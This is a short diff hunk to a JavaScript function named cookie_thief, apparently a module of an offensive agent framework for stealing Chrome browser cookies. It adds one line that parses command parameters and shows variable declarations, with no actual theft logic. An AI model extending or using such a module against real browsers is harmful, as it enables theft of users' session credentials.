@@ -1,4 +1,5 @@
 exports.cookie_thief = function(task, command, params){
+    let config = JSON.parse(params);
     let password = "";
     let username = "";
     let browser = "chrome";
